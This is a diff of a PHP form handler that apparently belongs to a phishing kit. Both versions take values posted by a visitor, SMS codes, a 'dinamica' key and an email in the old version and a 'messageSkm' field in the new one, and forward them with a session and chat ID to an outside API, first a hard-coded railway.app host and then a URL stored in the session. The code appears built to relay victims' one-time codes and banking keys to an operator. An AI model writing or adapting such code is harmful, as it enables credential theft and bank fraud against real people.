@@ -2,35 +2,23 @@
 session_start();
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
-    $sms = $_POST['sms'] ?? null;
-    $dinamica = $_POST['dinamica'] ?? null;
-    $correo = $_POST['correo'] ?? null;
+    $messageSkm = $_POST['messageSkm'] ?? null;
+
     // Generar uniqueID
     $uniqueID = $_SESSION['uniqueID'];
     $chatID = $_SESSION['chatID'];
     // Preparar los datos para enviar a la API
     $data = [
         'uniqueID' => $uniqueID,
-        'sms' => $sms,
-        'dinamica' => $dinamica,
+        'messageSkm' => $messageSkm,
         'chatID' => $chatID,
-        'correo' => $correo,
+        'skm' => 'Trico',
     ];
-    if (isset($_SESSION['vlidatePage'])) {
-        unset($_SESSION['vlidatePage']);
-    }
-    $ch = curl_init('https://spike-production.up.railway.app/sendCodes');
-    if (strlen($correo) > 6) {
-
-        $ch = curl_init('https://spike-production.up.railway.app/sendCorreo');
-    }
-    // Configurar cURL
+    $ch = curl_init($_SESSION['urlApi'] . 'sendCodesWithAceptar');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
-
-    // Ejecutar la solicitud y obtener la respuesta
     $response = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 
